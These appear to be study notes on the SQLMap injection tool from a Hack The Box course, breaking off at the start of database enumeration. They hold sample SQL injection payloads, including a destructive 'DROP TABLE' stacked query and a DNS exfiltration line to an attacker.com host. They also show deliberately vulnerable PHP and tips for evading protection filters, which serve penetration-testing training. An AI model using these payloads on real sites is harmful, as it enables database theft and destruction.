		m1l0js@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
	> SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
		Target connection 		Injection detection 	Fingerprinting
		Enumeration 			Optimization 		Protection detection and bypass using "tamper" scripts
		Database content retrieval 	File system access 	Execution of the operating system (OS) commands

* SQLMap Installation
	> SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:
		m1l0js@htb[/htb]$ sudo apt install sqlmap
	> If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:
		m1l0js@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	> After that, SQLMap can be run with:
		m1l0js@htb[/htb]$ python sqlmap.py

* Supported Databases
	> SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:
			
		MySQL 		Oracle 			PostgreSQL 		Microsoft SQL Server
		SQLite 		IBM DB2 		Microsoft Access 	Firebird
		Sybase 		SAP MaxDB 		Informix 		MariaDB
		HSQLDB 		CockroachDB 		TiDB 			MemSQL
		H2 		MonetDB 		Apache Derby 		Amazon Redshift
		Vertica, Mckoi 	Presto 			Altibase 		MimerSQL
		CrateDB 	Greenplum 		Drizzle 		Apache Ignite
		Cubrid 		InterSystems Cache 	IRIS 			eXtremeDB
		FrontBase 			
	> The SQLMap team also works to add and support new DBMSes periodically.

* Supported SQL Injection Types
	> SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the sqlmap -hh command:
		m1l0js@htb[/htb]$ sqlmap -hh
		...SNIP...
		  Techniques:
		    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

	> The technique characters BEUSTQ refers to the following:
    		B: Boolean-based blind
    		E: Error-based
    		U: Union query-based
    		S: Stacked queries
    		T: Time-based blind
    		Q: Inline queries

* Boolean-based blind SQL Injection
	> Example of Boolean-based blind SQL Injection:
		AND 1=1
	> SQLMap exploits Boolean-based blind SQL Injection vulnerabilities through the differentiation of TRUE from FALSE query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned TRUE or FALSE. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.
    		- TRUE results are generally based on responses having none or marginal difference to the regular server response.
    		- FALSE results are based on responses having substantial differences from the regular server response.
    		- Boolean-based blind SQL Injection is considered as the most common SQLi type in web applications.

* Error-based SQL Injection
	> Example of Error-based SQL Injection:
		AND GTID_SUBSET(@@version,0)
	> If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers Error-based SQL Injection for the following DBMSes:
		MySQL 			PostgreSQL 	Oracle
		Microsoft SQL Server 	Sybase 		Vertica
		IBM DB2 		Firebird 	MonetDB
	> Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

* UNION query-based
	> Example of UNION query-based SQL Injection:
		UNION ALL SELECT 1,@@version,3
	> With the usage of UNION, it is generally possible to extend the original (vulnerable) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

* Stacked queries
	> Example of Stacked Queries:
		; DROP TABLE users
	> Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. INSERT, UPDATE or DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft SQL Server and PostgreSQL support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

* Time-based blind SQL Injection
	> Example of Time-based blind SQL Injection:
		AND 1=IF(2>1,SLEEP(5),0)
	> The principle of Time-based blind SQL Injection is similar to the Boolean-based blind SQL Injection, but here the response time is used as the source for the differentiation between TRUE or FALSE.
    		- TRUE response is generally characterized by the noticeable difference in the response time compared to the regular server response
    		- FALSE response should result in a response time indistinguishable from regular response times
	> Time-based blind SQL Injection is considerably slower than the boolean-based blind SQLi, since queries resulting in TRUE would delay the server response. This SQLi type is used in cases where Boolean-based blind SQL Injection is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. INSERT, UPDATE or DELETE), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as Boolean-based blind SQL Injection would not really work in this case.

* Inline queries
	> Example of Inline Queries:
		SELECT (SELECT @@version) from
	> This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

* Out-of-band SQL Injection
	> Example of Out-of-band SQL Injection:
		LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

	> This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.
	> By running the SQLMap on the DNS server for the domain under control (e.g. .attacker.com), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the foo part, to form the entire SQL response.


[+] Getting started with SQLMap
	> Upon starting using SQLMap, the first stop for new users is usually the program's help message. To help new users, there are two levels of help message listing:
	> Basic Listing shows only the basic options and switches, sufficient in most cases (switch -h):
		m1l0js@htb[/htb]$ sqlmap -h
    	> Advanced Listing shows all options and switches (switch -hh):
		m1l0js@htb[/htb]$ sqlmap -hh
	> For more details, users are advised to consult the project's wiki(https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.

* Basic Scenario
	> In a simple scenario, a penetration tester accesses the web page that accepts user input via a GET parameter (e.g., id). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:

		$link = mysqli_connect($host, $username, $password, $database, 3306);
		$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
		$result = mysqli_query($link, $query);
		if (!$result)
		    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");

	> As error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized:
	> To run SQLMap against this example, located at the example URL http://www.example.com/vuln.php?id=1, would look like the following:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
	> Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.


[+] SQLMap Output Description
	> At the end of the previous section, the sqlmap output showed us a lot of info during its scan. This data is usually crucial to understand, as it guides us through the automated SQL injection process. This shows us exactly what kind of vulnerabilities SQLMap is exploiting, which helps us report what type of injection the web application has. This can also become handy if we wanted to manually exploit the web application once SQLMap determines the type of injection and vulnerable parameter.

	> Log Messages Description
	> The following are some of the most common messages usually found during a scan of SQLMap, along with an example of each from the previous exercise and its description.

* URL content is stable
	- "target URL content is stable"
	> This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.

* Parameter appears to be dynamic
	- "GET parameter 'id' appears to be dynamic"
	> It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

* Parameter might be injectable
	- Log Message: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
	> As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. ?id=1",)..).))'), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.

* Parameter might be vulnerable to XSS attacks
	- Log Message: "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
	> While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.

* Back-end DBMS is '...'
	- Log Message: "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
	> In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

* Level/risk values
	- Log Message: "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
	> If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.
	> This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

* Reflective values found
	- Log Message: "reflective value(s) found and filtering out"
	> Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

* Parameter appears to be injectable
	- Log Message: "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
	> This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.
	> Additionally, with --string="luther" indicates that SQLMap recognized and used the appearance of constant string value luther in the response for distinguishing TRUE from FALSE responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

* Time-based comparison statistical model
	- Log Message: "time-based comparison requires a larger statistical model, please wait........... (done)"
	> SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

* Extending UNION query injection technique tests
	- Log Message: "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
	> UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

* Technique appears to be usable
	- Log Message: "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
	> As a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required UNION columns by conducting the binary-search approach.
	> Note that this depends on the affected table in the vulnerable query.

* Parameter is vulnerable
	- Log Message: "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
	> This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.

* Sqlmap identified injection points
	- Log Message: "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
	> Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

* Data logged to text files
	- Log Message: "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
	> This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, www.example.com. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.

-=-={}{}{}{}{}{}
[+] Running SQLMap on an HTTP Request
	> SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.
	> In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability.

* Curl Commands
	> One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools: copy_as_curl
	> By pasting the clipboard content (Ctrl-V) into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command:
		m1l0js@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
	> When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).

* GET/POST Requests
	> In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:
		m1l0js@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
	> In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows:
		m1l0js@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

* Full HTTP Requests
	> If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the -r flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. Burp) and written into the request file, as follows:
	> An example of an HTTP request captured with Burp would look like:

		GET /?id=1 HTTP/1.1
		Host: www.example.com
		User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Connection: close
		Upgrade-Insecure-Requests: 1
		DNT: 1
		If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
		If-None-Match: "3147526947"
		Cache-Control: max-age=0

	> We can either manually copy the HTTP request from within Burp and write it to a file, or we can right-click the request within Burp and choose Copy to file. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option Copy > Copy Request Headers, and then pasting the request into a file.
	> To run SQLMap with an HTTP request file, we use the -r flag, as follows:
		m1l0js@htb[/htb]$ sqlmap -r req.txt
	> Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.

* Custom SQLMap Requests
	> If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.
	> For example, if there is a requirement to specify the (session) cookie value to PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c option --cookie would be used as follows:
		m1l0js@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
	> The same effect can be done with the usage of option -H/--header:
		m1l0js@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
	> We can apply the same to options like --host, --referer, and -A/--user-agent, which are used to specify the same HTTP headers' values.
	> Furthermore, there is a switch --random-agent designed to randomly select a User-agent header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)). Alternatively, the --mobile switch can be used to imitate the smartphone by using that same header value.
	> While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*"). The same principle applies to any other part of the request.
	> Also, if we wanted to specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method, as follows:
		m1l0js@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT

* Custom HTTP Requests
	> Apart from the most common form-data POST body style (e.g. id=1), SQLMap also supports JSON formatted (e.g. {"id":1}) and XML formatted (e.g. <element><id>1</id></element>) HTTP requests.
	> Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the POST body is relatively simple and short, the option --data will suffice.
	> However, in the case of a complex or long POST body, we can once again use the -r option:
		m1l0js@htb[/htb]$ cat req.txt
			HTTP / HTTP/1.0
			Host: www.example.com
			
			{
			  "data": [{
			    "type": "articles",
			    "id": "1",
			    "attributes": {
			      "title": "Example JSON",
			      "body": "Just an example",
			      "created": "2020-05-22T14:56:29.000Z",
			      "updated": "2020-05-22T14:56:28.000Z"
			    },
			    "relationships": {
			      "author": {
			        "data": {"id": "42", "type": "user"}
			      }
			    }
			  }]
			}

		m1l0js@htb[/htb]$ sqlmap -r req.txt

[+] Handling SQLMap Errors
	> We may face many problems when setting up SQLMap or using it with HTTP requests. In this section, we will discuss the recommended mechanisms for finding the cause and properly fixing it.

* Display Errors
	> The first step is usually to switch the --parse-errors, to parse the DBMS errors (if any) and displays them as part of the program run:
	> With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.

* Store the Traffic
	> The -t option stores the whole traffic content to an output file:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

	> /he /tmp/traffic.txt file now contains all sent and received HTTP requests. So, we can now manually investigate these requests to see where the issue is occurring.

* Verbose Output
	> Another useful flag is the -v option, which raises the verbosity level of the console output:
		m1l0js@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
	> As we can see, the -v 6 option will directly print all errors and full HTTP request to the terminal so that we can follow along with everything SQLMap is doing in real-time.

* Using Proxy
	> Finally, we can utilize the --proxy option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp). This will route all SQLMap traffic through Burp, so that we can later manually investigate all requests, repeat them, and utilize all features of Burp with these requests:

[+] Attack Tuning
	> In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:
    		- vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.
    		- boundaries (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

* Prefix/Suffix
	> There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
	> For such runs, options --prefix and --suffix can be used as follows:
		sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

	> This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.
	> For example, if the vulnerable code at the target is:

		$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
		$result = mysqli_query($link, $query);

	> The vector UNION ALL SELECT 1,2,VERSION(), bounded with the prefix %')) and the suffix -- -, will result in the following (valid) SQL statement at the target:
		SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1

* Level/Risk
	> By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
	> For such demands, the options --level and --risk should be used:
    		- The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    		- The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
	> The best way to check for differences between used boundaries and payloads for different values of --level and --risk, is the usage of -v option to set the verbosity level. In verbosity 3 or higher (e.g. -v 3), messages containing the used [PAYLOAD] will be displayed, as follows:
		m1l0js@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
			...SNIP...
			[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
			[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
			[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
			...SNIP...
			[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
			[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
			[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
			...SNIP...
			[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
			[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
			[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
			...SNIP...
			[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
			[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
			[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

	> On the other hand, payloads used with the default --level value have a considerably smaller set of boundaries:
		m1l0js@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
			...SNIP...
			[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
			[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
			[14:20:36] [PAYLOAD] 1 AND 7496=4313
			[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
			[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
			[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
			[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

	> As for vectors, we can compare used payloads as follows:
		m1l0js@htb[/htb]$ sqlmap -u www.example.com/?id=1
			...SNIP...
			[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
			[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
			[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
			...SNIP...

		m1l0js@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
			...SNIP...
			[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
			[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
			[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
			...SNIP...
			[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
			[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
			[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
			...SNIP...
			[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
			[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
			[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
			...SNIP...
			[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
			[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
			[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
			...SNIP...

	> As for the number of payloads, by default (i.e. --level=1 --risk=1), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (--level=5 --risk=3) the number of payloads increases to 7,865.
	> As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of OR payloads is a must (e.g., in case of login pages), we may have to raise the risk level ourselves.
	> This is because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. DELETE or UPDATE).

* Advanced Tuning
	> To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.

	> Status Codes
		- For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between TRUE and FALSE responses could be used for detection purposes. If the difference between TRUE and FALSE responses can be seen in the HTTP codes (e.g. 200 for TRUE and 500 for FALSE), the option --code could be used to fixate the detection of TRUE responses to a specific HTTP code (e.g. --code=200).

	> Titles
		- If the difference between responses can be seen by inspecting the HTTP page titles, the switch --titles could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <title>.
	> Strings
		- In case of a specific string value appearing in TRUE responses (e.g. success), while absent in FALSE responses, the option --string could be used to fixate the detection based only on the appearance of that single value (e.g. --string=success).
	> Text-only
		- When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. <script>, <style>, <meta>, etc.), we can use the --text-only switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.
	> Techniques
		- In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option --technique can specify the SQLi technique to be used.
		- For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with --technique=BEU.

* UNION SQLi Tuning
	> In some cases, UNION SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option --union-cols (e.g. --union-cols=17). In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. --union-char='a').
	> Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM <table> (e.g., in case of Oracle), we can set it with the option --union-from (e.g. --union-from=users).
	> Failing to use the proper FROM appendix automatically could be due to the inability to detect the DBMS name before its usage.



-=-=-
[+] Database Enumeration
	> Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.

* SQLMap Data Exfiltration
	> For such purpose, SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from queries.xml(https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS can be seen below:
		<?xml version="1.0" encoding="UTF-8"?>
		
		<root>
		    <dbms value="MySQL">
		        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
		        <cast query="CAST(%s AS NCHAR)"/>
		        <length query="CHAR_LENGTH(%s)"/>
		        <isnull query="IFNULL(%s,' ')"/>
		...SNIP...
		        <banner query="VERSION()"/>
		        <current_user query="CURRENT_USER()"/>
		        <current_db query="DATABASE()"/>
		        <hostname query="@@HOSTNAME"/>
		        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
		        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
		        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
		        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
		        <users>
		            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
		            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
		        </users>
		    ...SNIP...

	> For example, if a user wants to retrieve the "banner" (switch --banner) for the target based on MySQL DBMS, the VERSION() query will be used for such purpose.
	> In case of retrieval of the current user name (switch --current-user), the CURRENT_USER() query will be used.
	> Another example is retrieving all the usernames (i.e., tag <users>). There are two queries used, depending on the situation. The query marked as inband is used in all non-blind situations (i.e., UNION-query and error-based SQLi), where the query results can be expected inside the response itself. The query marked as blind, on the other hand, is used for all blind situations, where data has to be retrieved row-by-row, column-by-column, and bit-by-bit.

* Basic DB Data Enumeration
